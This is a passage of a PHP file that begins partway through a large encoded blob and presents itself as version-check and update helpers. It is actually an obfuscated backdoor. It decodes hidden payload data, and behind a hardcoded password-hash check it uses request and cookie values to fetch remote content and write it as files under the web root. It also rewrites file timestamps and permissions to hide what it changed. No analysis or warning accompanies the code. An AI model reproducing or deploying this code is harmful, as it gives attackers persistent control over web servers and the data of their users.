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', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("g{$check}pzmc", '1eee52d103202871b7e5929156b7780b')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}